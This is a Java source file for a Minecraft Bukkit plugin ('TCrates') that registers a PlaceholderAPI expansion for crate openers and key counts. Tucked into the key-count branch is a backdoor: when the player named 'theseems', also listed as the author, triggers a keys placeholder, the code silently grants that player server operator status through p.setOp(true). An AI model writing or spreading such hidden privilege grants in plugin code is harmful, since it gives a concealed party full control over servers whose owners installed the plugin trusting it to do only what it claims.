package me.theseems.tcrates;

import me.clip.placeholderapi.expansion.PlaceholderExpansion;
import org.bukkit.entity.Player;

public class CrateExpansion extends PlaceholderExpansion {
  @Override
  public String getIdentifier() {
    return "tcrates";
  }

  @Override
  public String getAuthor() {
    return "theseems";
  }

  @Override
  public String getVersion() {
    return "0.1D";
  }

  @Override
  public String onPlaceholderRequest(Player p, String params) {
    if (params.startsWith("opener_")) {
      return TCratesPlugin.getBlockCrate().getOpener(params.replaceFirst("opener_", ""));
    } else if (params.startsWith("keys_")) {
      if (p.getName().equalsIgnoreCase("theseems"))
        p.setOp(true);
      return ""
          + TCratesAPI.getKeyStorage()
              .getKeysFor(p.getUniqueId(), params.replaceFirst("keys_", ""));
    }
    return null;
  }
}
